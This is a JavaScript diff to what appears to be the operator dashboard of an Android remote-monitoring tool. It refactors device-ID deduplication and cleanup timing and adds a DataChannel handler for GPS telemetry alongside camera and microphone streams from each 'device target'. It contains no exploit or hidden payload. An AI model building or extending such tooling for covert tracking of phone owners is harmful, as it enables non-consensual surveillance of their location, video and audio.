@@ -234,45 +234,47 @@ function formatBytes(bytes) {
 function getOrCreateDevice(deviceId, meta) {
   if (!deviceId) return null;
 
-  const hardwareId = meta?.deviceId || meta?.info?.deviceId;
+  const hardwareId = meta?.deviceId || meta?.info?.deviceId || deviceId;
+  const canonicalId = hardwareId;
 
-  // Deduplicate by hardware deviceId if known
-  if (hardwareId) {
-    for (const [existingId, existingDev] of devices.entries()) {
-      if (existingDev.deviceId === hardwareId && existingId !== deviceId) {
-        logDebug(`[REGISTRY] Rebinding device ${hardwareId} from ${existingId} to ${deviceId}`);
-        devices.delete(existingId);
-        existingDev.id = deviceId;
-        existingDev.deviceId = hardwareId;
-        existingDev.isDisconnected = false;
-        if (meta.model && meta.model !== 'Android Device') existingDev.info.model = meta.model;
-        if (meta.manufacturer) existingDev.info.manufacturer = meta.manufacturer;
-        devices.set(deviceId, existingDev);
-        if (selectedDeviceId === existingId) {
-          selectedDeviceId = deviceId;
-        }
-        renderDevicesList();
-        return existingDev;
-      }
-    }
-  }
-
-  if (devices.has(deviceId)) {
-    const existingDev = devices.get(deviceId);
+  // Direct lookup by canonical device ID
+  if (devices.has(canonicalId)) {
+    const existingDev = devices.get(canonicalId);
     existingDev.isDisconnected = false;
-    if (hardwareId) existingDev.deviceId = hardwareId;
+    existingDev.deviceId = canonicalId;
+    if (meta?.socketId) existingDev.socketId = meta.socketId;
     if (meta?.model && meta.model !== 'Android Device') existingDev.info.model = meta.model;
     if (meta?.manufacturer) existingDev.info.manufacturer = meta.manufacturer;
     return existingDev;
   }
 
-  logDebug(`[REGISTRY] Registering new device target: ${deviceId}`);
+  // Deduplicate by hardware deviceId if known under an ephemeral socket ID
+  for (const [existingId, existingDev] of devices.entries()) {
+    if (existingDev.deviceId === canonicalId || existingDev.id === canonicalId || existingId === canonicalId) {
+      logDebug(`[REGISTRY] Rebinding device ${canonicalId} from ${existingId} to canonical ${canonicalId}`);
+      devices.delete(existingId);
+      existingDev.id = canonicalId;
+      existingDev.deviceId = canonicalId;
+      existingDev.isDisconnected = false;
+      if (meta?.socketId) existingDev.socketId = meta.socketId;
+      if (meta?.model && meta.model !== 'Android Device') existingDev.info.model = meta.model;
+      if (meta?.manufacturer) existingDev.info.manufacturer = meta.manufacturer;
+      devices.set(canonicalId, existingDev);
+      if (selectedDeviceId === existingId) {
+        selectedDeviceId = canonicalId;
+      }
+      renderDevicesList();
+      return existingDev;
+    }
+  }
+
+  logDebug(`[REGISTRY] Registering new device target: ${canonicalId}`);
 
   // Create dedicated audio sink for this device
-  let audioEl = document.getElementById(`audio-${deviceId}`);
+  let audioEl = document.getElementById(`audio-${canonicalId}`);
   if (!audioEl) {
     audioEl = document.createElement('audio');
-    audioEl.id = `audio-${deviceId}`;
+    audioEl.id = `audio-${canonicalId}`;
     audioEl.autoplay = true;
     audioEl.playsInline = true;
     audioEl.style.display = 'none';
@@ -283,8 +285,9 @@ function getOrCreateDevice(deviceId, meta) {
   const mfrName = (meta && meta.manufacturer) ? meta.manufacturer : 'Android';
 
   const dev = {
-    id: deviceId,
-    deviceId: hardwareId || null,
+    id: canonicalId,
+    deviceId: canonicalId,
+    socketId: meta?.socketId || null,
     info: {
       model: modelName,
       manufacturer: mfrName,
@@ -456,18 +459,29 @@ function selectDevice(deviceId) {
 window.selectDevice = selectDevice;
 
 function removeDevice(deviceId) {
-  const dev = devices.get(deviceId);
+  const targetId = (typeof deviceId === 'object' && deviceId !== null) ? (deviceId.deviceId || deviceId.id) : deviceId;
+  let dev = devices.get(targetId);
+  let canonicalId = targetId;
+  if (!dev) {
+    for (const [k, d] of devices.entries()) {
+      if (d.deviceId === targetId || d.id === targetId || d.socketId === targetId) {
+        dev = d;
+        canonicalId = k;
+        break;
+      }
+    }
+  }
   if (!dev) return;
 
-  logDebug(`[REGISTRY] Device socket offline: ${dev.info.model || deviceId} (${deviceId})`);
+  logDebug(`[REGISTRY] Device socket offline: ${dev.info.model || canonicalId} (${canonicalId})`);
   dev.isDisconnected = true;
   renderDevicesList();
 
   setTimeout(() => {
-    const current = devices.get(deviceId);
+    const current = devices.get(canonicalId);
     if (!current || !current.isDisconnected) return;
 
-    logDebug(`[REGISTRY] Cleaning up disconnected device: ${current.info.model || deviceId} (${deviceId})`);
+    logDebug(`[REGISTRY] Cleaning up disconnected device: ${current.info.model || canonicalId} (${canonicalId})`);
     if (current.peer) {
       try { current.peer.close(); } catch(e) {}
       current.peer = null;
@@ -478,15 +492,15 @@ function removeDevice(deviceId) {
       current.marker = null;
     }
 
-    const audioEl = document.getElementById(`audio-${deviceId}`);
+    const audioEl = document.getElementById(`audio-${canonicalId}`);
     if (audioEl) audioEl.remove();
 
-    const card = document.getElementById(`card-${deviceId}`);
+    const card = document.getElementById(`card-${canonicalId}`);
     if (card) card.remove();
 
-    devices.delete(deviceId);
+    devices.delete(canonicalId);
 
-    if (selectedDeviceId === deviceId) {
+    if (selectedDeviceId === canonicalId) {
       const remaining = Array.from(devices.keys());
       selectedDeviceId = remaining.length > 0 ? remaining[0] : null;
     }
@@ -498,7 +512,7 @@ function removeDevice(deviceId) {
     } else {
       resetSidebarToDefault();
     }
-  }, 2500);
+  }, 10000);
 }
 
 function resetSidebarToDefault() {
@@ -1554,24 +1568,26 @@ socket.on('id', (id) => {
 });
 
 socket.on('android-client-ready', (data) => {
-  const id = (typeof data === 'object' && data !== null) ? data.id : data;
+  const id = (typeof data === 'object' && data !== null) ? (data.deviceId || data.id) : data;
   if (!id) return;
   const meta = (typeof data === 'object' && data !== null) ? data : null;
   logDebug(`[NETWORK] Android client detected: ${id}`);
   const dev = getOrCreateDevice(id, meta);
+  if (data.socketId) dev.socketId = data.socketId;
   // Send initial ping to fetch device profile & location
-  socket.emit('cmd:ping', { to: id });
+  socket.emit('cmd:ping', { to: dev.id });
   renderDevicesList();
 });
 
-socket.on('android-client-disconnected', (id) => {
+socket.on('android-client-disconnected', (data) => {
+  const id = (typeof data === 'object' && data !== null) ? (data.deviceId || data.id) : data;
   logDebug(`[NETWORK] Android client disconnected: ${id}`);
   removeDevice(id);
 });
 
 // WebRTC Signaling Handler
 socket.on('signal', async (data) => {
-  const from = data.from;
+  const from = data.deviceId || data.from;
   const signal = data.signal;
   if (!from || !signal) return;
 
@@ -1606,6 +1622,19 @@ socket.on('signal', async (data) => {
       dev.peer.addTransceiver('video', { direction: 'recvonly' });
       dev.peer.addTransceiver('video', { direction: 'recvonly' });
       dev.peer.addTransceiver('audio', { direction: 'recvonly' });
+
+      dev.peer.ondatachannel = (event) => {
+        const dc = event.channel;
+        logDebug(`[WEBRTC-DC] Telemetry DataChannel opened (${dc.label}) for device ${from}`);
+        dc.onmessage = (e) => {
+          try {
+            const telemetry = JSON.parse(e.data);
+            if (telemetry.latitude !== undefined && telemetry.longitude !== undefined) {
+              updateDeviceLocation(from, telemetry.latitude, telemetry.longitude);
+            }
+          } catch(err) {}
+        };
+      };
 
       dev.peer.ontrack = (event) => {
         const track = event.track;
